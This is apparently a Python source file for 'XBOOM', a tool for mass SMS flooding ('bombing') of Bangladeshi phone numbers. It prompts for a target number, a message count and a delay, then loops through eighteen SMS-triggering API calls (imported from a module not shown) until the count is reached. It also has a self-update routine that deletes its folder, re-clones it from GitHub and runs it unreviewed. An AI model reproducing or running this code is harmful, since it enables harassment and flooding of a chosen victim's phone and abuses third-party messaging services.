# XBOOM TOOL
# Tool : Unlimited SMS Bombing In Bangladeshi Numbers
#Author : XBOOM TOOL
# Coder : ZIHAD HOSSAIN RAFI

import time
import requests
import sys
import os
import shutil
from data import *

#Get Rows and Columns of Screen
columns = shutil.get_terminal_size().columns

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

#Check Update
def update():
    try:
        toolVersion = open("./version.txt", "r").read()
    except:
        toolVersion = "MRZIHAD"
    
    try:
        mainVersion = requests.get("https://github.com/MR-ZIHAD/XBOOM/main/version.txt").text
    except:
        psb("\n\033[92m    [\033[91m!\033[92m] Please Connect To The Internet!")
        time.sleep(1)
        l = input("\033[92m    [\033[37m*\033[92m] Press Enter To Continue...")
        update()
    
    #If Tool Version Is Same, Then Return/Close Function
    if (toolVersion == mainVersion):
        return
    
    psb("\n\033[92m    [\033[37m!\033[92m] Tool Update Found!")
    time.sleep(0.5)
    psb("\033[92m    [\033[37m!\033[92m] Updating Tool...")
    
    os.system("cd .. && rm -rf XBOOM && git clone https://github.com/MR-ZIHAD/XBOOM > /dev/null 2>&1")
    
    psb("\n\033[92m    [\033[37m*\033[92m] Update Complete!")
    psb("\033[92m    [\033[37m*\033[92m] Starting Tool...")
    time.sleep(0.8)
    
    os.system("cd .. && cd XBOOM && python XBOOM.py")


#Logo
def logo():
    print("""\n
\033[1;92m  
▒██   ██▒ ▄▄▄▄    ▒█████   ▒█████   ███▄ ▄███▓
▒▒ █ █ ▒░▓█████▄ ▒██▒  ██▒▒██▒  ██▒▓██▒▀█▀ ██▒
░░  █   ░▒██▒ ▄██▒██░  ██▒▒██░  ██▒▓██    ▓██░
 ░ █ █ ▒ ▒██░█▀  ▒██   ██░▒██   ██░▒██    ▒██ 
▒██▒ ▒██▒░▓█  ▀█▓░ ████▓▒░░ ████▓▒░▒██▒   ░██▒
▒▒ ░ ░▓ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░   ░  ░
░░   ░▒ ░▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░ ░  ░      ░
 ░    ░   ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒  ░      ░   
 \033[1;92m   | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;31;1m \033[1;92m [✔︎] \033[1;31;1mAuthor    :  \033[1;92m ZIHAD HOSSAIN RAFI           \033[1;31;1m
\033[1;31;1m \033[1;92m [✔︎] \033[1;31;1mWhatsapp  :  \033[1;92m 8801842827520          \033[1;31;1m
\033[1;31;1m \033[1;92m [✔︎] \033[1;31;1mGitHub    : \033[1;92m  MR-ZIHAD       \033[1;31;1m
\033[1;31;1m \033[1;92m [✔︎] \033[1;31;1mTEAM      :  \033[1;92m STRIKER\033[1;31;1m
\033[1;31;1m \033[1;92m [✔︎] \033[1;31;1mVersion   :  \033[1;92m 1.9                  \033[1;31;1m
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••""")


#Options Banner
def banner():
    amount = str(main.amount)
    if (len(amount) == 1):
        amount = amount + "                    "
    elif (len(amount) == 2):
        amount = amount + "                   "
    elif (len(amount) == 3):
        amount = amount + "                  "
    elif (len(amount) == 4):
        amount = amount + "                 "
    #print(" ", end="")
    print("\033[95m-" * (columns), end = "")
    #print(" ")
    print(("\033[92mTarget  : \033[37m0" + main.number + "          ").center(columns + 10))
    print(("\033[92mAmount  : \033[37m" + amount).center(columns + 10))
    print("\033[92mProcess : \033[37mStarted               ".center(columns + 10))
    print("\033[92mNote    : \033[37mPress ctrl + z To Stop".center(columns + 10))
    #print(" ", end="")
    print("\033[95m-" * (columns), end = "")
    print("\n")


#Check SMS Sent and Process
def check(sent):
    amount = main.amount
    delay = main.delay
    
    print("\r\033[92m    [\033[94m#\033[92m] Massage Sent : \033[94m[\033[37m" + str(sent) + "\033[94m]\033[37m", end="")
    
    if (sent == amount):
        psb("\n\n\033[92m    [\033[37m*\033[92m] Bombing Finished!")
        psb("\033[92m    [\033[37m*\033[92m] Amount : \033[37m" + str(amount))
        psb("\033[92m    [\033[37m*\033[92m] Target : \033[37m0" + main.number)
        psb("\033[92m    [\033[37m*\033[92m] From   : \033[37mXBOOM\n")
        time.sleep(0.6)
        print("\033[92m[\033[93m★\033[92m] Thanks For Using Our Tool \033[92m[\033[93m★\033[92m]".center(columns + 30))
        print("\033[37m")
        
        return True
    else:
        time.sleep(delay)
        return False


#Get Target Number
def getNumber():
    number = input("\n    \033[92m[\033[37m*\033[92m] Enter Target Number:> \033[37m")
    try:
        int(number)
    except:
        psb("\n\033[92m    [\033[91m!\033[92m] Please Enter a Correct Number!")
        number = getNumber()
    if not (len(number) == 11):
        psb("\n\033[92m    [\033[91m!\033[92m] Please Enter 11 Digit Number!")
        number = getNumber()
    
    return number


#Main    
def main():
    number = getNumber()
    number = number[-10:]
    main.number = number
    
    amount = input("    \033[92m[\033[37m*\033[92m] Enter Amount (\033[37mDefault: 10\033[92m):> \033[37m")
    try:
        amount = int(amount)
    except:
        amount = 10
    
    main.amount = amount
    
    delay = input("    \033[92m[\033[37m*\033[92m] Enter Time(\033[37mSec\033[92m) Delay (\033[37mDefault: 2s\033[92m):> \033[37m")
    try:
        int(delay)
    except:
        delay = 2
    
    main.delay = int(delay)
    
    time.sleep(1)
    logo()
    banner()
    sent = 0
    while True:
        code = api1(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api2(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api3(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api4(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api5(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api6(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api7(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api8(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api9(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api10(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api11(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api12(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api13(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api14(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api15(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api16(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api17(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api18(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break



if __name__ == "__main__":
    logo()
    update()
    main()
